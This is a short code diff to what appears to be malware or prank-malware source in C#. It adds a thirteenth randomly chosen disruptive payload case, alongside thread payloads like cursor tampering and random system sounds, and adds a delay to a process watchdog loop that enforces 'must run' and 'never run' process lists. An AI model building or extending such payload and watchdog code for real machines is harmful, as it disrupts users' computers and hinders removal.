@@ -24,7 +24,7 @@ namespace Abantes.Payloads
             Thread cursoricon = new Thread(new ThreadStart(Annoying.CursorIcon));
             while (true)
             {
-                switch (_random.Next(12))
+                switch (_random.Next(13))
                 {
                     case 0:
                         Thread randomOSsound = new Thread(new ThreadStart(Annoying.RandomOSSounds));
@@ -98,6 +98,7 @@ namespace Abantes.Payloads
             string[] MustRun = { "Rules" };
             while (true)
             {
+                Thread.Sleep(1000);
                 WatchDog.ProcessWatchDog(MustRun, NeverRun);
             }
         }
